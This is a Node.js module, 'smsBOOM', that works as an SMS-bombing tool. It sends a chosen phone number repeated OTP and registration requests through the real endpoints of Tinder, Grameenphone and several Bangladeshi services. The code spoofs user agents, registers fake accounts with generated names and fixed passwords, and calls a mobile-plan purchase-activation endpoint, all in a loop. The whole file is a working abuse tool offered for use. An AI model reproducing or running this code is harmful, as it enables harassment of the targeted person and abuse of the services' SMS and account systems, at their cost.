const request = require("request");
const colors = require("colors");

const moment = require("moment");
const faker = require("faker");

async function delay(s) {
  return new Promise((resolve) => setTimeout(resolve, s * 1000));
}
const randomUseragent = {
  "User-Agent": faker.internet.userAgent(),
  "Accept-Language": "en",
  "Content-Type": "application/json",
};

async function smsBOOM(number, amount) {
  let dataFSms = {
    date: moment().format("DD.MM.YYYY HH:mm:ss"),
    number: number,
    sent: 0,
    faild: 0,
  };

  function ecuriar(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .get(
        `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${no}`
      )
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;

          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function swap(number) {
    request
      .post({
        url: "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en",
        headers: randomUseragent,
        body: JSON.stringify({
          phone: number,
        }),
      })
      .on("response", function (response) {
        if (response.code == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function bdtickets(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://api.bdtickets.com:20100/v1/auth",
        headers: randomUseragent,
        body: JSON.stringify({
          applicationChannel: "WEB_APP",
          createUserCheck: true,
          phoneNumber: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function easybd(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request

      .post({
        url: "https://core.easy.com.bd/api/v1/registration",
        headers: randomUseragent,
        body: JSON.stringify({
          name: faker.name.firstName(),
          email: faker.internet.email(),
          mobile: no,
          password: "12345678",
          password_confirmation: "12345678",
          device_key: "eca27eb4404c33101098537fff27dab3",
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function rabbithole(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://apix.rabbitholebd.com/appv2/login/requestOTP",
        headers: randomUseragent,
        body: JSON.stringify({
          mobile: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function qcoom(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://auth.qcoom.com/api/v1/otp/send",
        headers: randomUseragent,
        body: JSON.stringify({
          mobileNumber: `+88${no}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  function fundesh(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
        headers: randomUseragent,
        body: JSON.stringify({
          msisdn: `${no.substring(1)}`,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  //https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web

  function ghoori(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
        headers: randomUseragent,
        body: JSON.stringify({
          mobile_no: no,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  // https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation

  function gpwebms(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
        headers: randomUseragent,
        body: JSON.stringify({
          bioscope: 0,
          bundle_id: 610744,
          data: 2560,
          fourg: 0,
          is_login: false,
          longevity: 3,
          mca: 0,
          msisdn: no,
          payment_mode: "mobile_balance",
          price: 83.2,
          sms: 0,
          voice: 25,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          return dataFSms;
        } else {
          dataFSms.faild++;
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        return dataFSms;
      });
  }

  // https://weblogin.grameenphone.com/backend/api/v1/otp

  function weblogin(no) {
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
    request
      .post({
        url: "https://weblogin.grameenphone.com/backend/api/v1/otp",
        headers: randomUseragent,
        body: JSON.stringify({
          msisdn: no,
        }),
      })
      .on("response", function (response) {
        if (response.statusCode == 200) {
          dataFSms.sent++;
          console.log(response);
          return dataFSms;
        } else {
          dataFSms.faild++;
          console.log(response);
          return dataFSms;
        }
      })
      .on("error", function (error) {
        dataFSms.faild++;
        console.log(error);
        return dataFSms;
      });
  }

  // function https://webapi.robi.com.bd/v1/account/login/otp

  function send(no) {
    ecuriar(no);
    swap(no);
    bdtickets(no);
    easybd(no);
    rabbithole(no);
    qcoom(no);
    fundesh(no);
    ghoori(no);
    gpwebms(no);
    weblogin(no);
    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
  }

  for (let i = 0; i < amount; i++) {
    await delay(5);
    send(number);
  }
}

module.exports = smsBOOM;
